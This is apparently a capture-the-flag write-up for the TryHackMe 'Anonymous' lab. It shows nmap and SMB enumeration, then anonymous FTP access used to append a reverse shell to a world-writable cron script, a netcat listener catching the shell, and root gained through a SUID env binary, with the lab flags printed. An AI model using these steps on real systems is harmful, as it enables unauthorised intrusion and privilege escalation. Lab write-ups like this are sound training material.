https://tryhackme.com/room/anonymous

#1 	Enumerate the machine.  How many ports are open?

scan using nmap automator


```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-05 20:48 EDT
Nmap scan report for 10.10.175.242
Host is up (0.41s latency).
Not shown: 880 closed ports, 116 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 9.23 seconds
```

answer: 4

#2 	What service is running on port 21?

answer: ftp

#3 	What service is running on ports 139 and 445?

answer: smb

#4 	There's a share on the user's computer.  What's it called?

```
kali@kali:~$ smbclient -L 10.10.175.242
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

answer: pics

#5 	user.txt

connect to smb service and download files

```
kali@kali:~/Downloads$ smbclient //10.10.175.242/pics
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

                20508240 blocks of size 1024. 13306816 blocks available
smb: \> get corgo2.jpg
getting file \corgo2.jpg of size 42663 as corgo2.jpg (19.0 KiloBytes/sec) (average 19.0 KiloBytes/sec)
smb: \> get puppos.jpeg
getting file \puppos.jpeg of size 265188 as puppos.jpeg (60.6 KiloBytes/sec) (average 46.5 KiloBytes/sec)

```
we get two pictures of dogs

connect to ftp
we find the script clean.sh and removed_files.log
looking inside removed_files.log it looks like clean.sh is a cron job that is executing periodically
we can use the append command in ftp to append a reverse shell line into the bash script 

```
kali@kali:~/Downloads$ ftp 10.10.73.1
Connected to 10.10.73.1.
220 NamelessOne's FTP Server!
Name (10.10.73.1:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
-rw-rw-r--    1 1000     1000         1247 Sep 06 02:56 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
```

```
226 Directory send OK.
ftp> append
(local-file) clean.sh
(remote-file) clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
40 bytes sent in 0.00 secs (765.9314 kB/s)
ftp> get clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (354 bytes).
226 Transfer complete.
354 bytes received in 0.00 secs (1.1722 MB/s)
```

setup a listener on our machine and we get a connection

```
kali@kali:~$ netcat -lvnp 1234
listening on [any] 1234 ...
connect to [10.4.9.144] from (UNKNOWN) [10.10.73.1] 54800
bash: cannot set terminal process group (1242): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ whoami
whoami
namelessone
namelessone@anonymous:~$ ls
ls
pics
user.txt
namelessone@anonymous:~$ cat user.txt
cat user.txt
90d6f992585815ff991e68748c414740
```

#6 	root.txt

run linpeas.sh

used SUID bit set on env to get root

```
kali@kali:~$ netcat -lvnp 1234
listening on [any] 1234 ...
connect to [10.4.9.144] from (UNKNOWN) [10.10.13.112] 56988
bash: cannot set terminal process group (1670): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ env /bin/sh -p
env /bin/sh -p
whoami
root
cd /root
ls
root.txt
cat root.txt
4d930091c31a622a7ed10f27999af363
```
